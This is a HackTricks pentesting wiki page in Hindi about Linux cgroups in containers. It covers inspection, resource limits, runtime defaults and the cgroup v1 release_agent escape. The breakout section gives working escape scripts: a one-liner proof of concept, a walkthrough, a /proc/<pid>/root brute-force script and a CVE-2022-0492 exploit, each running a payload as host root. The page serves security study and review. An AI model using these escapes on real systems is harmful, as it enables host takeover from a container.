# cgroups

{{#include ../../../../banners/hacktricks-training.md}}

## Overview

Linux **control groups** ऐसे kernel mechanism हैं जिनका उपयोग processes को accounting, limiting, prioritization और policy enforcement के लिए एक साथ group करने में किया जाता है। यदि namespaces मुख्य रूप से resources के view को isolate करने से संबंधित हैं, तो cgroups मुख्य रूप से यह नियंत्रित करने से संबंधित हैं कि processes का कोई set उन resources में से **कितना** consume कर सकता है और कुछ मामलों में, वे **किस प्रकार के resources** के साथ interact कर सकते हैं। Containers लगातार cgroups पर निर्भर करते हैं, भले ही user उन्हें सीधे कभी न देखे, क्योंकि लगभग हर modern runtime को kernel को यह बताने का तरीका चाहिए कि "ये processes इस workload से संबंधित हैं और इन पर ये resource rules लागू होते हैं।"

इसी कारण container engines नए container को अपने अलग cgroup subtree में रखते हैं। Process tree के वहां पहुंचने के बाद runtime memory को cap कर सकता है, PIDs की संख्या limit कर सकता है, CPU usage का weight निर्धारित कर सकता है, I/O को regulate कर सकता है और device access को restrict कर सकता है। Production environment में यह multi-tenant safety और सामान्य operational hygiene दोनों के लिए आवश्यक है। Meaningful resource controls के बिना कोई container memory exhaust कर सकता है, system में processes की बाढ़ ला सकता है या CPU और I/O पर इतना अधिक अधिकार कर सकता है कि host या neighboring workloads unstable हो जाएं।

Security के दृष्टिकोण से cgroups दो अलग तरीकों से महत्वपूर्ण हैं। पहला, खराब या अनुपस्थित resource limits सीधे denial-of-service attacks को enable करते हैं। दूसरा, कुछ cgroup features, विशेष रूप से पुराने **cgroup v1** setups में, container के अंदर से writable होने पर historically powerful breakout primitives बना चुके हैं।

## v1 Vs v2

दुनिया में दो प्रमुख cgroup models मौजूद हैं। **cgroup v1** multiple controller hierarchies expose करता है, और पुराने exploit writeups अक्सर वहां उपलब्ध अजीब और कभी-कभी अत्यधिक powerful semantics पर आधारित होते हैं। **cgroup v2** अधिक unified hierarchy और सामान्यतः cleaner behavior प्रस्तुत करता है। Modern distributions तेजी से cgroup v2 को prefer कर रहे हैं, लेकिन mixed या legacy environments अभी भी मौजूद हैं, जिसका अर्थ है कि real systems की समीक्षा करते समय दोनों models अभी भी relevant हैं।

यह अंतर महत्वपूर्ण है क्योंकि कुछ सबसे प्रसिद्ध container breakout stories, जैसे cgroup v1 में **`release_agent`** का abuse, विशेष रूप से पुराने cgroup behavior से जुड़े हैं। जो reader किसी blog पर cgroup exploit देखता है और फिर उसे blindly modern cgroup v2-only system पर apply करता है, वह target पर वास्तव में क्या संभव है, इसे गलत समझ सकता है।

## Inspection

यह देखने का सबसे तेज तरीका कि आपका current shell कहां स्थित है, यह है:
```bash
cat /proc/self/cgroup
findmnt -T /sys/fs/cgroup
```
`/proc/self/cgroup` फ़ाइल वर्तमान process से जुड़े cgroup paths दिखाती है। आधुनिक cgroup v2 host पर, आपको अक्सर एक unified entry दिखाई देगी। पुराने या hybrid host पर, आपको कई v1 controller paths दिखाई दे सकते हैं। Path पता चलने के बाद, limits और current usage देखने के लिए आप `/sys/fs/cgroup` के अंतर्गत संबंधित files को inspect कर सकते हैं।

cgroup v2 host पर, निम्न commands उपयोगी हैं:
```bash
ls -l /sys/fs/cgroup
cat /sys/fs/cgroup/cgroup.controllers
cat /sys/fs/cgroup/cgroup.subtree_control
```
ये files दिखाती हैं कि कौन-से controllers मौजूद हैं और कौन-से child cgroups को delegated किए गए हैं। यह delegation model rootless और systemd-managed environments में महत्वपूर्ण है, जहाँ runtime केवल cgroup functionality के उस subset को control कर सकता है जिसे parent hierarchy वास्तव में delegate करती है।

## Lab

व्यवहार में cgroups को observe करने का एक तरीका memory-limited container चलाना है:
```bash
docker run --rm -it --memory=256m debian:stable-slim bash
cat /proc/self/cgroup
cat /sys/fs/cgroup/memory.max 2>/dev/null || cat /sys/fs/cgroup/memory.limit_in_bytes 2>/dev/null
```
आप PID-limited container भी आज़मा सकते हैं:
```bash
docker run --rm -it --pids-limit=64 debian:stable-slim bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
```
ये examples उपयोगी हैं क्योंकि वे runtime flag को kernel file interface से जोड़ने में सहायता करते हैं। Runtime magic के जरिए rule लागू नहीं कर रहा होता; वह संबंधित cgroup settings लिखता है और फिर kernel को process tree पर उन्हें लागू करने देता है।

## Runtime का उपयोग

Docker, Podman, containerd और CRI-O सभी अपने सामान्य operation के हिस्से के रूप में cgroups पर निर्भर करते हैं। इनके बीच अंतर आमतौर पर इस बात में नहीं होता कि वे cgroups का उपयोग करते हैं या नहीं, बल्कि इस बात में होता है कि **वे कौन-से defaults चुनते हैं**, **वे systemd के साथ कैसे interact करते हैं**, **rootless delegation कैसे काम करता है**, और **configuration का कितना हिस्सा engine level के बजाय orchestration level पर नियंत्रित होता है**।

Kubernetes में resource requests और limits अंततः node पर cgroup configuration बन जाते हैं। Pod YAML से kernel enforcement तक का रास्ता kubelet, CRI runtime और OCI runtime से होकर गुजरता है, लेकिन rule को अंततः लागू करने वाला kernel mechanism फिर भी cgroups ही होते हैं। Incus/LXC environments में भी cgroups का व्यापक उपयोग होता है, खासकर इसलिए क्योंकि system containers अक्सर अधिक समृद्ध process tree और VM जैसे operational expectations expose करते हैं।

## Misconfigurations और Breakouts

Classic cgroup security story writable **cgroup v1 `release_agent`** mechanism है। इस model में, यदि attacker सही cgroup files में write कर सके, `notify_on_release` enable कर सके और `release_agent` में stored path को नियंत्रित कर सके, तो cgroup के empty होने पर kernel host के initial namespaces में attacker द्वारा चुने गए path को execute कर सकता है। इसी कारण पुराने writeups cgroup controller writability, mount options और namespace/capability conditions पर इतना ध्यान देते हैं।

`release_agent` उपलब्ध न होने पर भी cgroup mistakes महत्वपूर्ण रहती हैं। अत्यधिक broad device access से host devices container से reachable हो सकते हैं। Missing memory और PID limits simple code execution को host DoS में बदल सकते हैं। Rootless scenarios में weak cgroup delegation defenders को यह मानने के लिए भी भ्रमित कर सकती है कि कोई restriction मौजूद है, जबकि runtime उसे वास्तव में apply करने में सक्षम ही नहीं था।

### `release_agent` Background

`release_agent` technique केवल **cgroup v1** पर लागू होती है। मूल विचार यह है कि जब किसी cgroup में अंतिम process exit करता है और `notify_on_release=1` set होता है, तो kernel उस program को execute करता है जिसका path `release_agent` में stored होता है। यह execution **host के initial namespaces** में होता है, और यही writable `release_agent` को container escape primitive में बदलता है।

Technique के काम करने के लिए attacker को सामान्यतः इनकी आवश्यकता होती है:

- एक writable **cgroup v1** hierarchy
- child cgroup बनाने या उपयोग करने की ability
- `notify_on_release` set करने की ability
- `release_agent` में path write करने की ability
- ऐसा path जो host के दृष्टिकोण से executable तक resolve हो

### Classic PoC

Historical one-liner PoC है:
```bash
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p "$d/w"
echo 1 > "$d/w/notify_on_release"
t=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
touch /o
echo "$t/c" > "$d/release_agent"
cat <<'EOF' > /c
#!/bin/sh
ps aux > "$t/o"
EOF
chmod +x /c
sh -c "echo 0 > $d/w/cgroup.procs"
sleep 1
cat /o
```
यह PoC `release_agent` में payload path लिखता है, cgroup release को trigger करता है, और फिर host पर बनाई गई output file को वापस पढ़ता है।

### पढ़ने योग्य Walk-Through

इसी विचार को चरणों में विभाजित करने पर समझना आसान होता है।

1. एक writable cgroup बनाएँ और उसे तैयार करें:
```bash
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp    # or memory if available in v1
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
```
2. उस host path की पहचान करें जो container filesystem के अनुरूप है:
```bash
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
3. एक payload डालें जो host path से दिखाई देगा:
```bash
cat <<'EOF' > /cmd
#!/bin/sh
ps aux > /output
EOF
chmod +x /cmd
```
4. cgroup को खाली करके execution trigger करें:
```bash
sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"
sleep 1
cat /output
```
इसका प्रभाव host root privileges के साथ payload का host-side execution है। वास्तविक exploit में payload आमतौर पर एक proof file लिखता है, reverse shell spawn करता है, या host state को modify करता है।

### `/proc/<pid>/root` का उपयोग करने वाला Relative Path Variant

कुछ environments में container filesystem का host path स्पष्ट नहीं होता या storage driver द्वारा hidden होता है। ऐसी स्थिति में payload path को `/proc/<pid>/root/...` के माध्यम से व्यक्त किया जा सकता है, जहाँ `<pid>` current container में किसी process से संबंधित host PID है। यही relative-path brute-force variant का आधार है:
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

sleep 10000 &

cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh
OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}
ps -eaf > \${OUTPATH} 2>&1
__EOF__

chmod a+x ${PAYLOAD_PATH}

mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID}"
exit 1
fi
fi
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

sleep 1
cat ${OUTPUT_PATH}
```
यहाँ relevant trick brute force स्वयं नहीं, बल्कि path form है: `/proc/<pid>/root/...` kernel को host namespace से container filesystem के अंदर किसी file को resolve करने देता है, भले ही direct host storage path पहले से ज्ञात न हो।

### CVE-2022-0492 Variant

2022 में, CVE-2022-0492 ने दिखाया कि cgroup v1 में `release_agent` पर write करते समय **initial** user namespace में `CAP_SYS_ADMIN` की सही जाँच नहीं की जा रही थी। इससे vulnerable kernels पर यह technique काफी अधिक accessible हो गई, क्योंकि ऐसा container process जो cgroup hierarchy mount कर सकता था, host user namespace में पहले से privileged हुए बिना `release_agent` पर write कर सकता था।

Minimal exploit:
```bash
apk add --no-cache util-linux
unshare -UrCm sh -c '
mkdir /tmp/c
mount -t cgroup -o memory none /tmp/c
echo 1 > /tmp/c/notify_on_release
echo /proc/self/exe > /tmp/c/release_agent
(sleep 1; echo 0 > /tmp/c/cgroup.procs) &
while true; do sleep 1; done
'
```
एक vulnerable kernel पर, host `/proc/self/exe` को host root privileges के साथ execute करता है।

व्यावहारिक दुरुपयोग के लिए, पहले जाँचें कि environment अभी भी writable cgroup-v1 paths या खतरनाक device access को expose करता है:
```bash
mount | grep cgroup
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null -exec ls -l {} \;
find /sys/fs/cgroup -maxdepth 3 -writable 2>/dev/null | head -n 50
ls -l /dev | head -n 50
```
यदि `release_agent` मौजूद और writable है, तो आप पहले से ही legacy-breakout territory में हैं:
```bash
find /sys/fs/cgroup -maxdepth 3 -name notify_on_release 2>/dev/null
find /sys/fs/cgroup -maxdepth 3 -name cgroup.procs 2>/dev/null | head
```
यदि cgroup path स्वयं escape प्रदान नहीं करता, तो अगला व्यावहारिक उपयोग अक्सर denial of service या reconnaissance होता है:
```bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
cat /sys/fs/cgroup/memory.max 2>/dev/null
cat /sys/fs/cgroup/cpu.max 2>/dev/null
```
ये commands जल्दी बता देते हैं कि workload में fork-bomb चलाने, memory को आक्रामक रूप से consume करने या writable legacy cgroup interface का दुरुपयोग करने की गुंजाइश है या नहीं।

## Checks

किसी target की समीक्षा करते समय, cgroup checks का उद्देश्य यह जानना है कि कौन-सा cgroup model उपयोग में है, क्या container को writable controller paths दिखाई देते हैं, और क्या `release_agent` जैसे पुराने breakout primitives अभी प्रासंगिक हैं।
```bash
cat /proc/self/cgroup                                      # Current process cgroup placement
mount | grep cgroup                                        # cgroup v1/v2 mounts and mount options
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null   # Legacy v1 breakout primitive
cat /proc/1/cgroup                                         # Compare with PID 1 / host-side process layout
```
यहाँ क्या महत्वपूर्ण है:

- यदि `mount | grep cgroup` **cgroup v1** दिखाता है, तो पुराने breakout writeups अधिक प्रासंगिक हो जाते हैं।
- यदि `release_agent` मौजूद है और उस तक पहुँचा जा सकता है, तो यह तुरंत गहन जाँच के योग्य है।
- यदि दिखाई देने वाली cgroup hierarchy writable है और container में strong capabilities भी हैं, तो इस environment की अधिक सावधानी से समीक्षा की जानी चाहिए।

यदि आपको **cgroup v1**, writable controller mounts, और ऐसा container मिलता है जिसमें strong capabilities या weak seccomp/AppArmor protection भी है, तो इस combination पर सावधानीपूर्वक ध्यान देना चाहिए। cgroups को अक्सर एक उबाऊ resource-management विषय माना जाता है, लेकिन ऐतिहासिक रूप से वे कुछ सबसे instructive container escape chains का हिस्सा रहे हैं, क्योंकि "resource control" और "host influence" के बीच की boundary हमेशा उतनी स्पष्ट नहीं थी, जितना लोगों ने माना।

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | डिफ़ॉल्ट रूप से Enabled | Containers को automatically cgroups में रखा जाता है; resource limits optional होती हैं, जब तक उन्हें flags के साथ set न किया जाए | `--memory`, `--pids-limit`, `--cpus`, `--blkio-weight` को छोड़ देना; `--device`; `--privileged` |
| Podman | डिफ़ॉल्ट रूप से Enabled | `--cgroups=enabled` default है; cgroup namespace के defaults cgroup version के अनुसार अलग-अलग होते हैं (cgroup v2 पर `private`, कुछ cgroup v1 setups पर `host`) | `--cgroups=disabled`, `--cgroupns=host`, relaxed device access, `--privileged` |
| Kubernetes | डिफ़ॉल्ट रूप से runtime के माध्यम से Enabled | Pods और containers को node runtime द्वारा cgroups में रखा जाता है; fine-grained resource control `resources.requests` / `resources.limits` पर निर्भर करता है | resource requests/limits को छोड़ देना, privileged device access, host-level runtime misconfiguration |
| containerd / CRI-O | डिफ़ॉल्ट रूप से Enabled | cgroups normal lifecycle management का हिस्सा हैं | ऐसे direct runtime configs जो device controls को relax करते हैं या legacy writable cgroup v1 interfaces expose करते हैं |

महत्वपूर्ण अंतर यह है कि **cgroup का मौजूद होना** आमतौर पर default होता है, जबकि **useful resource constraints** अक्सर optional होती हैं, जब तक उन्हें explicitly configure न किया जाए।
{{#include ../../../../banners/hacktricks-training.md}}
